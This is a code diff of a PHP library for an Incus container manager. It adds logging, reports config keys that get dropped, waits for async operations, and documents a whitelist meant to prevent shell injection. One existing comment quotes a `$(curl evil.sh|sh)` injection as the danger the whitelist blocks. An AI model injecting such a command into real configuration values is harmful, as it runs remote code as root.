@@ -49,6 +49,15 @@ function incus_cfg_bool(array $cfg, string $key, bool $default): bool {
  * `$(curl evil.sh|sh)` would silently execute as root on the next boot. CPU
  * and MEMORY also accept an empty string (documented in incus.cfg as "no cap").
  * Returns null for keys with no registered pattern (caller decides what to do).
+ *
+ * IMPORTANT: incus-init.sh also sources several other free-text/shell-interpolated
+ * keys not listed here (DEVCONTAINER_BRIDGE, DEVCONTAINER_WORKSPACE_ROOT,
+ * DEVCONTAINER_AGENT_UID/GID, DEVCONTAINER_NESTING, the subnet/NAT/IPv6 keys) —
+ * this whitelist only covers the fields UpdateSettings.php currently exposes via
+ * POST. If a new field is ever made settable from the webGUI, a matching pattern
+ * MUST be added here first; nothing enforces that pairing automatically, and
+ * skipping it silently reopens the shell-injection risk this whitelist exists
+ * to close.
  */
 function incus_cfg_field_pattern(string $key): ?string {
     $patterns = [
@@ -92,11 +101,13 @@ function incus_cfg_lock_acquire(): ?string {
         }
         $mtime = @filemtime(INCUS_CFG_LOCK_PATH);
         if ($mtime !== false && (time() - $mtime) > INCUS_CFG_LOCK_STALE_SECONDS) {
-            @unlink(INCUS_CFG_LOCK_PATH); // holder likely crashed; steal it
+            error_log('incus: stealing stale incus.cfg lock (holder likely crashed)');
+            @unlink(INCUS_CFG_LOCK_PATH);
             continue;
         }
         usleep(50_000);
     }
+    error_log('incus: could not acquire incus.cfg lock within ' . INCUS_CFG_LOCK_TIMEOUT_SECONDS . 's; proceeding without it');
     return null; // proceed without the lock rather than hang the request
 }
 
@@ -118,19 +129,29 @@ function incus_cfg_lock_release(?string $token): void {
  * Defense in depth: any value containing a double quote or newline is
  * dropped from the update rather than written, since it would corrupt the
  * KEY="VALUE" line format — callers (e.g. UpdateSettings.php) should already
- * be validating with incus_validate_cfg_field(), this is a backstop.
+ * be validating with incus_validate_cfg_field(), this is a backstop. Dropped
+ * keys are reported back (not just silently discarded) so a validation gap
+ * upstream still surfaces to the admin instead of vanishing.
+ *
+ * @return array{ok: bool, dropped: string[]} ok=false means the write itself
+ *   failed (file missing/unwritable, or the temp-write/rename step failed) —
+ *   distinct from "nothing needed saving". dropped lists any keys rejected by
+ *   the quote/newline backstop above.
  */
-function incus_save_cfg(array $updates): bool {
-    if (!is_file(INCUS_CFG_PATH) || !is_writable(INCUS_CFG_PATH)) {
-        return false;
-    }
+function incus_save_cfg(array $updates): array {
+    $dropped = [];
     foreach ($updates as $key => $val) {
         if (strpbrk((string) $val, "\"\r\n") !== false) {
+            $dropped[] = $key;
             unset($updates[$key]);
         }
     }
     if (empty($updates)) {
-        return true; // nothing left to do, not an error
+        return ['ok' => true, 'dropped' => $dropped]; // nothing left to do, not a failure
+    }
+    if (!is_file(INCUS_CFG_PATH) || !is_writable(INCUS_CFG_PATH)) {
+        error_log('incus: cannot save incus.cfg — missing or not writable at ' . INCUS_CFG_PATH);
+        return ['ok' => false, 'dropped' => $dropped];
     }
 
     $lockToken = incus_cfg_lock_acquire();
@@ -162,9 +183,14 @@ function incus_save_cfg(array $updates): bool {
 
         $tmpPath = INCUS_CFG_PATH . '.tmp-' . getmypid();
         if (file_put_contents($tmpPath, implode("\n", $lines) . "\n") === false) {
-            return false;
+            error_log('incus: failed writing temp file for incus.cfg save at ' . $tmpPath);
+            return ['ok' => false, 'dropped' => $dropped];
         }
-        return rename($tmpPath, INCUS_CFG_PATH);
+        if (!rename($tmpPath, INCUS_CFG_PATH)) {
+            error_log('incus: failed renaming temp file over incus.cfg');
+            return ['ok' => false, 'dropped' => $dropped];
+        }
+        return ['ok' => true, 'dropped' => $dropped];
     } finally {
         incus_cfg_lock_release($lockToken);
     }
@@ -205,7 +231,37 @@ function incus_api(string $method, string $path, ?array $body = null): array {
     if (($parsed['type'] ?? null) === 'error') {
         return ['ok' => false, 'error' => $parsed['error'] ?? 'unknown incusd error'];
     }
-    return ['ok' => true, 'metadata' => $parsed['metadata'] ?? null];
+    return [
+        'ok' => true,
+        'type' => $parsed['type'] ?? 'sync',
+        'operation' => $parsed['operation'] ?? null,
+        'metadata' => $parsed['metadata'] ?? null,
+    ];
+}
+
+/** Wait for an Incus async operation to complete (mirrors waitForOperation() in incus.service.ts). */
+function incus_wait_operation(string $operationUrl, int $timeoutSec = 60): array {
+    $resp = incus_api('GET', "{$operationUrl}/wait?timeout={$timeoutSec}");
+    if (!$resp['ok']) return $resp;
+    if (($resp['metadata']['status'] ?? null) === 'Failure') {
+        return ['ok' => false, 'error' => 'Incus operation failed: ' . ($resp['metadata']['err'] ?? 'unknown error')];
+    }
+    return ['ok' => true, 'metadata' => $resp['metadata']];
+}
+
+/**
+ * Run an Incus API call and wait for it to finish if it returned an async
+ * operation (mirrors callAndWait() in incus.service.ts). Without this, a
+ * PUT .../state or DELETE can return before the container has actually
+ * stopped/been removed, letting a caller race ahead (e.g. deleting before a
+ * stop has really taken effect).
+ */
+function incus_api_and_wait(string $method, string $path, ?array $body = null): array {
+    $resp = incus_api($method, $path, $body);
+    if ($resp['ok'] && ($resp['type'] ?? null) === 'async' && !empty($resp['operation'])) {
+        return incus_wait_operation($resp['operation']);
+    }
+    return $resp;
 }
 
 /** GET /1.0 — is incusd reachable? */
@@ -243,7 +299,7 @@ function incus_validate_dev_container_name(string $name): bool {
     return preg_match('/^[A-Za-z][A-Za-z0-9-]{0,62}$/', $name) === 1;
 }
 
-/** start | stop | restart | freeze | unfreeze. */
+/** start | stop | restart | freeze | unfreeze. Waits for the underlying Incus operation to finish. */
 function incus_set_dev_container_state(string $name, string $action): array {
     $allowed = ['start', 'stop', 'restart', 'freeze', 'unfreeze'];
     if (!in_array($action, $allowed, true)) {
@@ -252,19 +308,27 @@ function incus_set_dev_container_state(string $name, string $action): array {
     if (!incus_validate_dev_container_name($name)) {
         return ['ok' => false, 'error' => 'invalid dev container name'];
     }
-    return incus_api('PUT', '/1.0/instances/' . rawurlencode($name) . '/state', [
+    return incus_api_and_wait('PUT', '/1.0/instances/' . rawurlencode($name) . '/state', [
         'action' => $action,
         'timeout' => $action === 'stop' ? 30 : 15,
         'force' => $action === 'stop',
     ]);
 }
 
+/**
+ * Best-effort stop, then delete (mirrors deleteDevContainer() in incus.service.ts).
+ * The stop is waited-on so the container is actually stopped before the
+ * DELETE is issued, not just "a stop request was sent" — otherwise DELETE
+ * can race a still-shutting-down container. The stop's result is ignored on
+ * purpose: the container may already be stopped or gone, and DELETE will
+ * surface a clear error itself if it truly can't proceed.
+ */
 function incus_delete_dev_container(string $name): array {
     if (!incus_validate_dev_container_name($name)) {
         return ['ok' => false, 'error' => 'invalid dev container name'];
     }
     incus_set_dev_container_state($name, 'stop');
-    return incus_api('DELETE', '/1.0/instances/' . rawurlencode($name));
+    return incus_api_and_wait('DELETE', '/1.0/instances/' . rawurlencode($name));
 }
 
 /**
